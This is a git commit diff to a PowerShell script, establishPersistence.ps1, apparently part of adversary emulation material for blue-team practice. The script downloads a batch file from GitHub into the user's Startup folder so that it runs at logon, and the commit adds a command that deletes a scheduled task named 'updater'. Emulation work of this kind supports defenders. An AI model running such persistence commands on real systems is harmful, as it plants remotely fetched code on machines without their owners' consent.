5573139fcc8be1f51abbd9217c80c46c75db7598
ZeroDayZealot <95112988+LeMagicKonch@users.noreply.github.com>
2025-09-04 12:40:20 -0700

    Update establishPersistence.ps1

--- Adversary Emulation/establishPersistence.ps1
+++ Adversary Emulation/establishPersistence.ps1
@@ -1,5 +1,4 @@
 Invoke-WebRequest -uri "https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adversary%20Emulation/startCalc.bat" -OutFile "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\startupPersistance.bat"
 
 # Delete Scheduled Task
-# TODO
-# schtasks /DELETE /TN updater /F
+Unregister-ScheduledTask -TaskName "updater" -Confirm:$false
